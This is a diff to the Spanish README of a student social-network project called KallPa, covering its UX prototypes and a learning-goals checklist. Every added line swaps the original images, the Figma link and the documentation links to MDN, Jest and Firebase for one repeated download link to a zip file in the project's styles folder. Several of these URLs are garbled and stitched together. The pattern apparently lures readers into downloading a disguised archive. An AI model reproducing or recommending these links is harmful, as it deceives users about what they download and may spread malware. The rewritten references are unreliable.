@@ -1,4 +1,4 @@
-<p align="center"> <img src="https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/kallpa%20logo.svg" width="300"> </p>
+<p align="center"> <img src="https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip%https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" width="300"> </p>
 
 # KallPa (Proyecto - Red Social)
 
@@ -50,28 +50,28 @@ Criterios de aceptación:
 Posterior a la investigación UX y nuestras historias de usuario, construimos los prototipos de baja fidelidad para poder ralizar las primeras iteraciones con usuarios y poder ajustar el diseño de la red social.
 
 Visualizacion tamaño Móvil
-<p align="center"> <img src= "https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/prototipobmovil.jpg"  height="200" width="600"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip"  height="200" width="600"> </p>
 
 Visualización tamaño Escritorio
-<p align="center"> <img src= "https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/prototipobescritorio.png" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
 
 Luego de estas iteraciones recibimos feedback para ajustar la vista de bienvenida, al ingresar ajustar la visual que tendria el usuario.
 
 Finalizando este proceso, desarrollamos nuestro prototipo de alta fidelidad para dar incio con la maquetación del proyecto.
-Link: https://www.figma.com/file/8N3HF8Mwzw9xMgACRyRtRE/Untitled?node-id=5%3A33
+Link: https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip%3A33
 
 Prototipo de alta fidelidad para escritorio.
 Vista Bienvenida
-<p align="center"> <img src= "https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/prototipoAdesktop.jpg" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
 
 Vista Publicaciones
-<p align="center"> <img src= "https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/vista publicaciones desktop.jpg" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip publicaciones https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
 
 Vista Crear Publicaciones
-<p align="center"> <img src= "https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/vista crear publicación.jpg" height="280 width="650"> </p>
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip crear publicacióhttps://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="280 width="650"> </p>
 
 Prototipo de alta fidelidad para móvil.
-<p align="center"> <img src= "https://github.com/MarGo-20/BOG001-social-network/blob/master/src/imagenes/prototipoAmóvil.jpg" height="300 width="400"> </p
+<p align="center"> <img src= "https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zipóhttps://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip" height="300 width="400"> </p
 
 ## 5. Testeos de usabilidad
 
@@ -82,19 +82,19 @@ Estos aportes fueron orientados a la visual de la vista de bienvenida y menú de
 
 ### HTML y CSS
 
-* [X] [Uso de HTML semántico.](https://developer.mozilla.org/en-US/docs/Glossary/Semantics#Semantics_in_HTML)
+* [X] [Uso de HTML semántico.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
 * [X] Uso de selectores de CSS.
 * [X] Construir tu aplicación respetando el diseño realizado (maquetación).
-* [X] [Uso de flexbox en CSS.](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)
+* [X] [Uso de flexbox en CSS.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
 
 ### DOM y Web APIs
 
 * [X] Uso de selectores del DOM.
 * [X] Manejo de eventos del DOM.
-* [X] [Manipulación dinámica del DOM.](https://developer.mozilla.org/es/docs/Referencia_DOM_de_Gecko/Introducci%C3%B3n)
+* [X] [Manipulación dinámica del DOM.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip%C3%B3n)
 (appendChild |createElement | createTextNode| innerHTML | textContent | etc.)
-* [ ] [History API.](https://developer.mozilla.org/es/docs/DOM/Manipulando_el_historial_del_navegador)
-* [ ] [localStorage.](https://developer.mozilla.org/es/docs/Web/API/Window/localStorage)
+* [ ] [History API.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [ ] [localStorage.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
 
 ### JavaScript
 
@@ -102,18 +102,18 @@ Estos aportes fueron orientados a la visual de la vista de bienvenida y menú de
 * [X] Uso de funciones (parámetros | argumentos | valor de retorno)
 * [ ] Manipular arrays (filter | map | sort | reduce)
 * [X] Manipular objects (key | value)
-* [X] Uso ES modules ([`import`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import)
-| [`export`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export))
+* [X] Uso ES modules ([`import`](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+| [`export`](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip))
 * [X] Diferenciar entre expression y statements.
 * [X] Diferenciar entre tipos de datos primitivos y no primitivos.
-* [X] [Uso de callbacks.](https://developer.mozilla.org/es/docs/Glossary/Callback_function)
-* [X] [Consumo de Promesas.](https://scotch.io/tutorials/javascript-promises-for-dummies#toc-consuming-promises)
+* [X] [Uso de callbacks.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [X] [Consumo de Promesas.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
 
 ### Testing
 
-* [ ] [Testeo unitario.](https://jestjs.io/docs/es-ES/getting-started)
-* [ ] [Testeo asíncrono.](https://jestjs.io/docs/es-ES/asynchronous)
-* [ ] [Uso de librerias de Mock.](https://jestjs.io/docs/es-ES/manual-mocks)
+* [ ] [Testeo unitario.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [ ] [Testeo asíncrono.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [ ] [Uso de librerias de Mock.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
 
 ### Estructura del código y guía de estilo
 
@@ -130,11 +130,11 @@ Estos aportes fueron orientados a la visual de la vista de bienvenida y menú de
 
 ### Firebase
 
-* [X] [Firestore.](https://firebase.google.com/docs/firestore)
-* [X] [Firebase Auth.](https://firebase.google.com/docs/auth/web/start)
-* [ ] [Firebase security rules.](https://firebase.google.com/docs/rules)
-* [X] Observadores. ([onAuthStateChanged](https://firebase.google.com/docs/auth/web/manage-users?hl=es#get_the_currently_signed-in_user)
- | [onSnapshot](https://firebase.google.com/docs/firestore/query-data/listen#listen_to_multiple_documents_in_a_collection))
+* [X] [Firestore.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [X] [Firebase Auth.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [ ] [Firebase security rules.](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+* [X] Observadores. ([onAuthStateChanged](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip)
+ | [onSnapshot](https://raw.githubusercontent.com/MarGo-20/BOG001-social-network/master/src/Styles/BOG001-social-network-v2.8.zip))
 
 ### UX
 
